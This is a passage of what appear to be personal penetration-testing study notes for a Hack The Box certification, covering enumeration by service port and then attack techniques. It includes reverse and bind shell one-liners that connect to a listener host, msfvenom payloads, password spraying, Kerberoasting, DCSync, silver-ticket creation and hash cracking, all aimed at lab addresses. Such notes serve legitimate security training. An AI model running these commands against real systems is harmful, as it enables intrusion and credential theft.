# Running odat
python3 -m venv ~/odat-env --system-site-packages
source ~/odat-env/bin/activate
python3 ./odat.py all -s 10.129.205.19
```

Logging in to the service
```shell
# RUN THIS SCRIPT FIRST BEFORE SQLPLUS (WILL GET AN INSTABLE SHELL BUT JUST RUN)
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip && wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip && sudo mkdir -p /opt/oracle && sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip && sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip && cd /opt/oracle/instantclient_21_4 && find . -type f | sort && export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH && export PATH=$LD_LIBRARY_PATH:$PATH && source ~/.bashrc && sqlplus -V

sqlplus scott/tiger@10.129.204.235/XE


# AUTO ENUM
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```

If you come across the following error sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory, please execute the below
```shell
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

Oracle RDBMS - File Upload
```shell
vernonlim03@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
vernonlim03@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

```shell
curl -X GET http://10.129.204.235/testing.txt
```



---

<a id="cpts-enumeration-service-enumeration-161-162-snmp-122c9bd9"></a>

<a id="cpts-enumeration-service-enumeration-161-162-snmp-122c9bd9--161162-snmp"></a>

# 161,162 snmp


This service is a UDP port, remember to scan for udp services if all else fails

 Scan commands
```bash
sudo nmap -sU -sC -sV -p 161,162 10.129.42.253

snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
snmpwalk -v 2c -c private  10.129.42.253
onesixtyone -c dict.txt 10.129.42.254
braa public@10.129.14.128:.1.3.6.*
```




---

<a id="cpts-enumeration-service-enumeration-21-ftp-2bf7eeb6"></a>

<a id="cpts-enumeration-service-enumeration-21-ftp-2bf7eeb6--21-ftp"></a>

# 21 ftp


<a id="cpts-enumeration-service-enumeration-21-ftp-2bf7eeb6--scanning"></a>

### Scanning
```bash
nmap -sC -sV -A -p21 10.129.42.253
nc -nv 10.129.42.253 21
telnet 10.129.42.253 21
ftp -p 10.129.42.253
ftp 10.129.42.253
openssl s_client -connect 10.129.14.136:21 -starttls ftp (if server has TLS/SSL)
```

<a id="cpts-enumeration-service-enumeration-21-ftp-2bf7eeb6--nmap-scripts"></a>

##### Nmap scripts
```shell
vernonlim03@htb[/htb]$ find / -type f -name ftp* 2>/dev/null | grep scripts

/usr/share/nmap/scripts/ftp-syst.nse
/usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse
/usr/share/nmap/scripts/ftp-vuln-cve2010-4221.nse
/usr/share/nmap/scripts/ftp-proftpd-backdoor.nse
/usr/share/nmap/scripts/ftp-bounce.nse
/usr/share/nmap/scripts/ftp-libopie.nse
/usr/share/nmap/scripts/ftp-anon.nse
/usr/share/nmap/scripts/ftp-brute.nse
```

<a id="cpts-enumeration-service-enumeration-21-ftp-2bf7eeb6--anonymous-login"></a>

##### Anonymous Login 
```bash
ftp 10.129.14.136

Connected to 10.129.14.136.
220 "Welcome to the HTB Academy vsFTP service."
Name (10.129.14.136:cry0l1t3): anonymous

230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.


ftp>
```

<a id="cpts-enumeration-service-enumeration-21-ftp-2bf7eeb6--ftp-console-enumeration"></a>

### FTP Console Enumeration
- Change directory using cd at least once (might have a message)
- Login as different users as they might be placed in their own home directories

<a id="cpts-enumeration-service-enumeration-21-ftp-2bf7eeb6--ftp-console-enumeration-commands"></a>

### FTP Console Enumeration Commands 
```ftp
status
debug
trace
ls
ls -al
ls -R
get Important\ Notes.txt (download file)
put testupload.txt (upload file)
```

<a id="cpts-enumeration-service-enumeration-21-ftp-2bf7eeb6--download-all-available-files"></a>

### Download All Available Files
```shell
vernonlim03@htb[/htb]$ wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
tree .
```
<a id="cpts-enumeration-service-enumeration-21-ftp-2bf7eeb6--vsftpd-server-files"></a>

### vsFTPd server files
```bash
/etc/vsftpd.conf (file for server logs)
```
![Pasted image 20250328224040.png](cpts/assets/Pasted%20image%2020250328224040.png)

<a id="cpts-enumeration-service-enumeration-21-ftp-2bf7eeb6--ftpusers-file-etcftpusers"></a>

#### FTPUSERS file (/etc/ftpusers) 
![Pasted image 20250328224556.png](cpts/assets/Pasted%20image%2020250328224556.png)
USED TO DENY PEOPLE FROM ACCESSING THE FTP SERVICE



<a id="cpts-enumeration-service-enumeration-21-ftp-2bf7eeb6--service-hardening-techniques"></a>

### Service Hardening Techniques
```bash
hide_ids=YES [All user and group information in directory listings will be displayed as "ftp".]
ls_recurse_enable=YES [Allows the use of recurse listings.]
```


---

<a id="cpts-enumeration-service-enumeration-22-ssh-cb7e3280"></a>

<a id="cpts-enumeration-service-enumeration-22-ssh-cb7e3280--22-ssh"></a>

# 22 ssh


Scan Commands
```bash
# in cpts-tools/ssh-audit
./ssh-audit.py 10.129.14.132
```

Connecting to ssh
```shell
ssh -v cry0l1t3@10.129.14.132
```

Changing authentication method for ssh
```shell
ssh -v cry0l1t3@10.129.14.132 -o PreferredAuthentications=password
```


---

<a id="cpts-enumeration-service-enumeration-25-587-smtp-a77466e5"></a>

<a id="cpts-enumeration-service-enumeration-25-587-smtp-a77466e5--25587-smtp"></a>

# 25,587 smtp


<a id="cpts-enumeration-service-enumeration-25-587-smtp-a77466e5--basic-scanning"></a>

#### Basic Scanning
```shell
sudo nmap 10.129.14.128 -sC -sV -p25,587
sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v
```

<a id="cpts-enumeration-service-enumeration-25-587-smtp-a77466e5--connecting-to-the-target"></a>

#### Connecting to the target
```bash
telnet 10.129.14.128 25
```

<a id="cpts-enumeration-service-enumeration-25-587-smtp-a77466e5--basic-telnet-commands"></a>

#### Basic telnet commands
![Pasted image 20250401220050.png](cpts/assets/Pasted%20image%2020250401220050.png)
![Pasted image 20250401220100.png](cpts/assets/Pasted%20image%2020250401220100.png)

<a id="cpts-enumeration-service-enumeration-25-587-smtp-a77466e5--smtp-user-enum"></a>

#### SMTP User Enum
![Pasted image 20250401225300.png](cpts/assets/Pasted%20image%2020250401225300.png)

<a id="cpts-enumeration-service-enumeration-25-587-smtp-a77466e5--default-config-file"></a>

#### Default Config File
```shell
cat /etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d"
```



---

<a id="cpts-enumeration-service-enumeration-3306-mysql-3d7e83f5"></a>

<a id="cpts-enumeration-service-enumeration-3306-mysql-3d7e83f5--3306-mysql"></a>

# 3306 mysql


Basic Commands
```shell
sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
```

Login Command
```shell
mysql -u root -h 10.129.14.132
mysql -u root -pP4SSw0rd -h 10.129.14.128

# if ssl fails
mysql -u robin -probin -h 10.129.42.195 --ssl=0

mysql -u root -p'root' -h 192.168.238.16 -P 3306 --ssl-verify-server-cert=FALSE
```

mysql important console commands
```shell-session
mysql> use sys;
mysql> show tables;  
```
![Pasted image 20250403004448.png](cpts/assets/Pasted%20image%2020250403004448.png)


---

<a id="cpts-enumeration-service-enumeration-3389-rdp-2169bdb7"></a>

<a id="cpts-enumeration-service-enumeration-3389-rdp-2169bdb7--3389-rdp"></a>

# 3389 rdp

Basic Commands
```shell
nmap -sV -sC 10.129.201.248 -p3389 --script rdp*
nmap -sV -sC 10.129.201.248 -p3389 --packet-trace --disable-arp-ping -n
sudo cpan
```

RDP Security check
```bash
#In cpts-tools/rdp-sec-check
./rdp-sec-check.pl 10.129.201.248
```

RDP Initiation command
```shell
xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248
```


---

<a id="cpts-enumeration-service-enumeration-512-514-r-services-39d8144a"></a>

<a id="cpts-enumeration-service-enumeration-512-514-r-services-39d8144a--512-514-r-services"></a>

# 512-514 r-services


- If the service is configured poorly, we might get free authentication
- If we are included in /etc/hosts.equiv or .rhosts files on the system

![Pasted image 20250403224738.png](cpts/assets/Pasted%20image%2020250403224738.png)

Basic Commands
```shell
sudo nmap -sV -p 512,513,514 10.0.17.2
```

Logging in using Rlogin
```shell
rlogin 10.0.17.2 -l htb-student
```


Finding Authenticated users using R-Commands
![Pasted image 20250403224858.png](cpts/assets/Pasted%20image%2020250403224858.png)

![Pasted image 20250403225049.png](cpts/assets/Pasted%20image%2020250403225049.png)


---

<a id="cpts-enumeration-service-enumeration-53-dns-982aa88f"></a>

<a id="cpts-enumeration-service-enumeration-53-dns-982aa88f--53-dns"></a>

# 53 dns


<a id="cpts-enumeration-service-enumeration-53-dns-982aa88f--dig-command"></a>

#### Dig Command
- the most basic dns query command
![Pasted image 20250401192631.png](cpts/assets/Pasted%20image%2020250401192631.png)
```bash
dig soa www.inlanefreight.com
dig ns inlanefreight.htb @10.129.14.128
```

<a id="cpts-enumeration-service-enumeration-53-dns-982aa88f--dns-server-version-query"></a>

#### DNS server version query
```shell
dig CH TXT version.bind 10.129.120.85
```

<a id="cpts-enumeration-service-enumeration-53-dns-982aa88f--list-all-available-dns-records-almost-all"></a>

#### List all available DNS Records (almost all)
```shell
dig any inlanefreight.htb @10.129.14.128
```
<a id="cpts-enumeration-service-enumeration-53-dns-982aa88f--dig-axfr-zone-transfer"></a>

#### Dig AXFR Zone Transfer
```shell
dig axfr inlanefreight.htb @10.129.14.128
dig axfr internal.inlanefreight.htb @10.129.14.128
```

<a id="cpts-enumeration-service-enumeration-53-dns-982aa88f--subdomain-bruteforcing"></a>

#### Subdomain Bruteforcing
```shell
for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done

dnsenum --dnsserver 10.129.42.195 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt inlanefreight.htb

```

DNS Abbreviations

| Abbv | Meaning                         |
| ---- | ------------------------------- |
| FQDN | Fully Qualified Domain Name     |
| AXFR | Asynchronous Full Transfer Zone |



Default Config Files (bind9)
- `named.conf.local`
- `named.conf.options`
- `named.conf.log`
-  all can be found in the /etc/bind directory 


---

<a id="cpts-enumeration-service-enumeration-5985-5986-winrm-4ff73d47"></a>

<a id="cpts-enumeration-service-enumeration-5985-5986-winrm-4ff73d47--59855986-winrm"></a>

# 5985,5986 WinRM

Basic Commands
```shell
nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n
```

Evil-winrm
```shell
evil-winrm -i 10.129.201.248 -u Cry0l1t3 -p P455w0rD!
```



---

<a id="cpts-enumeration-service-enumeration-623-ipmi-fd1b107c"></a>

<a id="cpts-enumeration-service-enumeration-623-ipmi-fd1b107c--623-ipmi"></a>

# 623 IPMI


Basic commands
```shell
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

msfconsole
use auxiliary/scanner/ipmi/ipmi_version
set rhosts 10.129.42.195
run

```

Getting hashes using msfconsole
```shell
msfconsole
use auxiliary/scanner/ipmi/ipmi_dumphashes 
set rhosts 10.129.42.195
show options 
run

hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
hashcat -m 7300 ipmi.txt /usr/share/wordlists/rockyou.txt 
```


---

<a id="cpts-enumeration-service-enumeration-80-443-http-3d6bc3e8"></a>

<a id="cpts-enumeration-service-enumeration-80-443-http-3d6bc3e8--80443-http"></a>

# 80,443 http

**Editor correction:** directory fuzzing varies the URL path. The copied Host-header example and fixed response-size filter were corrected below; compare candidates with a missing-path response. The original vault snapshot is unchanged.


- Check URL address for clues such as .html .php
- Ctrl-U and check source for further clues like comments or file extensions
- Inspect element as well just to be sure

- Inspect the network tab for when requests are being sent (request headers and body)
- lookout for sitemap.xml and robots.txt

<a id="cpts-enumeration-service-enumeration-80-443-http-3d6bc3e8--nmap"></a>

#### Nmap

```shell
sudo nmap -p80 -sC -sV 192.168.50.20
sudo nmap -p80 --script=http-enum 192.168.50.20
```

<a id="cpts-enumeration-service-enumeration-80-443-http-3d6bc3e8--directoryfile-enumeration"></a>

#### Directory/File Enumeration
```bash
gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt

URL='http://challenge.example'  # replace with the challenge URL
printf '%s\n' admin api backup export > words.txt
ffuf -u "$URL/FUZZ" -w words.txt -mc all -ac -t 1 -rate 1 -maxtime 30
```

<a id="cpts-enumeration-service-enumeration-80-443-http-3d6bc3e8--subdomain-enumeration"></a>

#### SubDomain Enumeration
```bash
gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt

ffuf -u http://siteisup.htb -H "Host: FUZZ.siteisup.htb" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fs 1131
```

<a id="cpts-enumeration-service-enumeration-80-443-http-3d6bc3e8--banner-grabbingweb-server-headers"></a>

#### Banner Grabbing/Web Server Headers
```bash
curl -IL https://www.inlanefreight.com
whatweb 10.10.10.121
whatweb --no-errors 10.10.10.0/24
```

<a id="cpts-enumeration-service-enumeration-80-443-http-3d6bc3e8--firefox-browse-to-ip"></a>

#### Firefox (Browse to IP)
Don't forget to do this and hit CTRL-U

<a id="cpts-enumeration-service-enumeration-80-443-http-3d6bc3e8--curl"></a>

#### CURL
```bash
curl http://10.129.42.190
```


<a id="cpts-enumeration-service-enumeration-80-443-http-3d6bc3e8--nikto"></a>

#### Nikto
```shell
nikto -h <ip>
```

<a id="cpts-enumeration-service-enumeration-80-443-http-3d6bc3e8--cewl"></a>

#### CEWL
<https://github.com/digininja/CeWL>


Additional Steps 
- View SSL/TLS Certificate
- Robots.txt
- View Source Code
- Add discovered domain into /etc/hosts

<a id="cpts-enumeration-service-enumeration-80-443-http-3d6bc3e8--burp"></a>

#### Burp

- to bypass client side validation
- Use repeater to keep repeating the sent request by manually changing
- Use intruder to automate the attack
- rmb to toggle foxyproxy

<a id="cpts-enumeration-service-enumeration-80-443-http-3d6bc3e8--api-enumeration"></a>

#### API Enumeration

- Often has ```/api_name/v1``` naming convention

Create the pattern first
```shell
{GOBUSTER}/v1
{GOBUSTER}/v2
```

Launch gobuster
```shell
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
```

We can then proceed to curl the found api endpoints to enumerate it further
```shell
curl -i http://192.168.50.16:5002/users/v1

#adding payload and changing to PUT
curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'
```




---

<a id="cpts-enumeration-service-enumeration-873-rsync-1ea34b15"></a>

<a id="cpts-enumeration-service-enumeration-873-rsync-1ea34b15--873-rsync"></a>

# 873 rsync

Basic Commands
```shell
sudo nmap -sV -p 873 127.0.0.1
nc -nv 127.0.0.1 873
rsync -av --list-only rsync://127.0.0.1/dev
```

Sync files 
```bash
rsync -av rsync://127.0.0.1/dev

#if rsync is configured to use ssh to transfer files
rsync -av rsync://127.0.0.1/dev -e "ssh -p2222"
```


---

<a id="cpts-enumeration-service-enumeration-public-exploits-06f789b1"></a>

<a id="cpts-enumeration-service-enumeration-public-exploits-06f789b1--public-exploits"></a>

# Public Exploits


Searchsploit
```bash
#Search names of services, port numbers, webpage title etc. to find vulnerabilites 
#Search for exploits 
searchsploit <application> 
# Example search for wordpress 5.8 vulnerabilities 
searchsploit wordpress 5.8 
# Download exploit 
searchsploit -m <exploit number>
```

Metasploit
```bash
msfconsole
search <wtv i want to search>
use exploit/windows/smb/ms17_010_psexec
set
check
exploit
```


---

<a id="cpts-exploits-bind-shell-47d00c53"></a>

<a id="cpts-exploits-bind-shell-47d00c53--bind-shell"></a>

# Bind Shell


On Target Machine:
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l  7777 > /tmp/f
```

On Kali:
```shell
nc -nv 10.129.41.200 7777
```


---

<a id="cpts-exploits-password-cracking-c9c27216"></a>

<a id="cpts-exploits-password-cracking-c9c27216--password-cracking"></a>

# Password Cracking

<https://hashes.com/en/decrypt/hash>

<a id="cpts-exploits-password-cracking-c9c27216--hashcat"></a>

## HashCat

<a id="cpts-exploits-password-cracking-c9c27216--methodology-for-password-cracking"></a>

#### Methodology for password cracking
```
Use hashcat with auto detection
Use hashcat and specify what hash with -m 
Use hashcat and specify base64 rule
Use hashcat mask attack
Move to john the ripper/other attack vectors
```

<a id="cpts-exploits-password-cracking-c9c27216--mask-attack-command"></a>

##### Mask attack command
```shell
hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'
```
	?l	       abcdefghijklmnopqrstuvwxyz
	?u	       ABCDEFGHIJKLMNOPQRSTUVWXYZ
	?d	       0123456789
	?h	       0123456789abcdef
	?H	       0123456789ABCDEF
	?s	       «space»!"#$%&'()*+,-./:;<=>?@[]^_`{
	?a	       ?l?u?d?s
	?b	       0x00 - 0xff

---
<a id="cpts-exploits-password-cracking-c9c27216--john-the-ripper"></a>

## John the Ripper

Usage:
```shell
john --format=<hash_type> --wordlist=<wordlist_file> <hash or hash_file>
```

<a id="cpts-exploits-password-cracking-c9c27216--wordlist-mode-vs-incremental-mode"></a>

### Wordlist mode vs Incremental mode

<a id="cpts-exploits-password-cracking-c9c27216--incremental"></a>

##### Incremental
Basically brute force using a specified character set, just put --incremental and you're good to go

<a id="cpts-exploits-password-cracking-c9c27216--wordlist"></a>

##### Wordlist
Dictionary attack using specified wordlist

<a id="cpts-exploits-password-cracking-c9c27216--cracking-files"></a>

### Cracking Files
- Cracking files which are password protected

![Pasted image 20250419165210.png](cpts/assets/Pasted%20image%2020250419165210.png)

<a id="cpts-exploits-password-cracking-c9c27216--list-of-tools-to-convert-into-john-crackable-format"></a>

##### List of tools to convert into john crackable format

- pdf2john
- ssh2john
- mscash2john
- keychain2john
- rar2john
- pfx2john
- truecrypt_volume2john
- keepass2john
- vncpcap2john
- putty2john
- zip2john
- hccap2john
- office2john
- wpa2john 
(rmb to remove the format: header in the new file before cracking)


<a id="cpts-exploits-password-cracking-c9c27216--john-the-ripper_1"></a>

## John the Ripper

```bash
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
```

To add rules, we must first have it the same format as hashcat's rules. Afterwards just append it to the end of the john.conf file
```bash
sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
```
![Pasted image 20250530110928.png](cpts/assets/Pasted%20image%2020250530110928.png)



---

<a id="cpts-exploits-password-spraying-brute-forcing-002cc339"></a>

<a id="cpts-exploits-password-spraying-brute-forcing-002cc339--password-spraying-brute-forcing"></a>

# Password Spraying (Brute forcing)


<a id="cpts-exploits-password-spraying-brute-forcing-002cc339--netexeccrackmapexec"></a>

### Netexec/Crackmapexec
```shell
netexec winrm 10.129.42.197 -u user.list -p password.list --continue-on-success
netexec smb 10.129.42.197 -u "user" -p "password" --shares
```
Good flags to use
--users
--groups
--loggedon-users
--shares
-M spider_plus --share 'SHARE NAME'
<a id="cpts-exploits-password-spraying-brute-forcing-002cc339--hydra"></a>

### Hydra
```shell
hydra -L user.list -P password.list ssh://10.129.42.197
hydra -L user.list -P password.list rdp://10.129.42.197
hydra -L user.list -P password.list smb://10.129.42.197
```
- for smb if the version is SMBv3 we might get an error if that happens use msfconsole

<a id="cpts-exploits-password-spraying-brute-forcing-002cc339--msfconsole"></a>

##### MSFConsole
```shell
vernonlim03@htb[/htb]$ msfconsole -q

msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > options 
```


<a id="cpts-exploits-password-spraying-brute-forcing-002cc339--on-windows"></a>

## On Windows

<a id="cpts-exploits-password-spraying-brute-forcing-002cc339--using-domainpasswordsprayps1"></a>

#### Using DomainPasswordSpray.ps1
```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```


---

<a id="cpts-exploits-reverse-shell-a7dfcd09"></a>

<a id="cpts-exploits-reverse-shell-a7dfcd09--reverse-shell"></a>

# Reverse Shell

Set up Netcat Listener
```bash
rlwrap nc -lvnp 1234
```

Bash Reverse Shell Command
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```
Bash Reverse Shell Command 2
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

<a id="cpts-exploits-reverse-shell-a7dfcd09--revshells-generator"></a>

#### Revshells Generator
<https://revshells.com>

<a id="cpts-exploits-reverse-shell-a7dfcd09--msfvenom"></a>

#### MSFVenom
```shell
msfvenom -l payloads

msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```


---

<a id="cpts-exploits-ad-exploits-as-rep-roasting-fe53b24b"></a>

<a id="cpts-exploits-ad-exploits-as-rep-roasting-fe53b24b--as-rep-roasting"></a>

# AS-REP Roasting


<a id="cpts-exploits-ad-exploits-as-rep-roasting-fe53b24b--use-impacket-if-you-have-creds-from-kali"></a>

# USE IMPACKET IF YOU HAVE CREDS FROM KALI
<a id="cpts-exploits-ad-exploits-as-rep-roasting-fe53b24b--use-rubeus-if-you-dont-have-creds-but-have-access-to-the-box"></a>

# USE RUBEUS IF YOU DON'T HAVE CREDS BUT HAVE ACCESS TO THE BOX


<a id="cpts-exploits-ad-exploits-as-rep-roasting-fe53b24b--impacket"></a>

### Impacket

```bash
impacket-GetNPUsers -dc-ip 192.168.50.70  -request corp.com/pete
```

Use mode 18200 on hashcat to crack
```bash
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```



<a id="cpts-exploits-ad-exploits-as-rep-roasting-fe53b24b--rubeus"></a>

### Rubeus

```powershell
.\Rubeus.exe asreproast /nowrap
```

Use mode 18200 on hashcat to crack
```bash
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```


---

<a id="cpts-exploits-ad-exploits-dcsync-attack-6c94bd8d"></a>

<a id="cpts-exploits-ad-exploits-dcsync-attack-6c94bd8d--dcsync-attack"></a>

# DCSync Attack



<a id="cpts-exploits-ad-exploits-dcsync-attack-6c94bd8d--impacket"></a>

### Impacket

```bash
sudo impacket-secretsdump corp.com/jeffadmin:'BrouhahaTungPerorateBroom2023!'@192.168.137.75
```

```bash
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```



<a id="cpts-exploits-ad-exploits-dcsync-attack-6c94bd8d--mimikatz"></a>

### Mimikatz

```mimikatz
lsadump::dcsync /user:corp\dave
```

```bash
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

![Pasted image 20250913220745.png](cpts/assets/Pasted%20image%2020250913220745.png)


---

<a id="cpts-exploits-ad-exploits-kerberoasting-8eb4e711"></a>

<a id="cpts-exploits-ad-exploits-kerberoasting-8eb4e711--kerberoasting"></a>

# Kerberoasting


<a id="cpts-exploits-ad-exploits-kerberoasting-8eb4e711--use-impacket-if-you-have-creds-from-kali"></a>

# USE IMPACKET IF YOU HAVE CREDS FROM KALI
<a id="cpts-exploits-ad-exploits-kerberoasting-8eb4e711--use-rubeus-if-you-dont-have-creds-but-have-access-to-the-box"></a>

# USE RUBEUS IF YOU DON'T HAVE CREDS BUT HAVE ACCESS TO THE BOX
<a id="cpts-exploits-ad-exploits-kerberoasting-8eb4e711--impacket"></a>

### Impacket

```bash
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete:Password
```

```bash
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```




<a id="cpts-exploits-ad-exploits-kerberoasting-8eb4e711--rubeus"></a>

### Rubeus 

```powershell
.\Rubeus.exe kerberoast /nowrap #PASTE IN CYBERCHEF TO REMOVE WHITESPACE
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap 
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap /tgtdeleg #req for rc4
```

```bash
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```


---

<a id="cpts-exploits-ad-exploits-llmnr-nbtns-poisoning-d7c6a994"></a>

<a id="cpts-exploits-ad-exploits-llmnr-nbtns-poisoning-d7c6a994--llmnr-nbtns-poisoning"></a>

# LLMNR-NBTNS Poisoning


<a id="cpts-exploits-ad-exploits-llmnr-nbtns-poisoning-d7c6a994--responder"></a>

### Responder

Common responder start commands
```shell
sudo responder -I ens244
sudo responder -I ens244 -wrf
```

NTLMV2 Cracking (module 5600)
```shell
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```


<a id="cpts-exploits-ad-exploits-llmnr-nbtns-poisoning-d7c6a994--inveigh-windows"></a>

### Inveigh (Windows)
Use the .exe one as opposed to the powershell one as it is maintained by the creator
```powershell
.\Inveigh.exe
(Hit esc after running to access the console)
HELP #view all commands 
GET NTLMV2UNIQUE
```


---

<a id="cpts-exploits-ad-exploits-silver-ticket-attack-996b78a5"></a>

<a id="cpts-exploits-ad-exploits-silver-ticket-attack-996b78a5--silver-ticket-attack"></a>

# Silver Ticket Attack


Use mimikatz to dump out the hash of the service account
![Pasted image 20250605180018.png](cpts/assets/Pasted%20image%2020250605180018.png)

Get the sid of the current logged in user
```powershell
whoami /user
```

Use mimikatz to create the silver ticket
```mimikatz
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```

Confirm the above works by using klist in powershell
```powershell
klist
```

<a id="cpts-exploits-ad-exploits-silver-ticket-attack-996b78a5--try-to-chain-it-so-that-itll-work-more-smoothly"></a>

## Try to chain it so that it'll work more smoothly
```powershell
.\mimikatz.exe "kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin" "exit"
```


---

<a id="cpts-exploits-service-exploits-dns-1358e590"></a>

<a id="cpts-exploits-service-exploits-dns-1358e590--dns"></a>

# DNS


<a id="cpts-exploits-service-exploits-dns-1358e590--dig-axfr-zone-transfer"></a>

## DIG - AXFR Zone Transfer
```shell
dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
```

<a id="cpts-exploits-service-exploits-dns-1358e590--fierce-enumeration"></a>

### Fierce Enumeration
enumerate all DNS servers of the root domain and scan for a DNS zone transfer
```shell
fierce --domain zonetransfer.me
```

<a id="cpts-exploits-service-exploits-dns-1358e590--subdomain-enumeration"></a>

### Subdomain Enumeration
```shell
subfinder -d inlanefreight.com -v

./subbrute.py inlanefreight.htb -s ./names.txt -r ./resolvers.txt
```


IF somehow need dns spoofing, refer to htb academy


---

<a id="cpts-exploits-service-exploits-ftp-73147af4"></a>

<a id="cpts-exploits-service-exploits-ftp-73147af4--ftp"></a>

# FTP


Connect to ftp
```shell-session
ftp 192.168.2.142
```

<a id="cpts-exploits-service-exploits-ftp-73147af4--always-try-anonymous-access-and-adminadmin"></a>

## Always try Anonymous access and admin:admin


<a id="cpts-exploits-service-exploits-ftp-73147af4--brute-force-login"></a>

### Brute force login
We can use medusa or hydra but just use hydra. If all else fails use netexec
```shell-session
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
hydra -l john -P /usr/share/wordlists/rockyou.txt ftp://10.29.148.23
```


<a id="cpts-exploits-service-exploits-ftp-73147af4--ftp-bounce-attack"></a>

#### FTP Bounce Attack
An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network. The attacker uses a `PORT` command to trick the FTP connection into running commands and getting information from a device other than the intended server.

The Nmap -b flag can be used to perform an FTP bounce attack:
```shell
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```


---

<a id="cpts-exploits-service-exploits-rdp-76d94045"></a>

<a id="cpts-exploits-service-exploits-rdp-76d94045--rdp"></a>

# RDP


<a id="cpts-exploits-service-exploits-rdp-76d94045--connecting-to-rdp-service"></a>

### Connecting to RDP service
```shell
xfreerdp3 /u:svc.callback /v:10.200.150.10 /p:Password1
xfreerdp3 /u:svc.callback /v:10.200.150.10 /pth:66338f1647cc6a33fd686cd20e7bb917
```

<a id="cpts-exploits-service-exploits-rdp-76d94045--brute-forcing-rdp-access"></a>

### Brute Forcing RDP Access
```shell
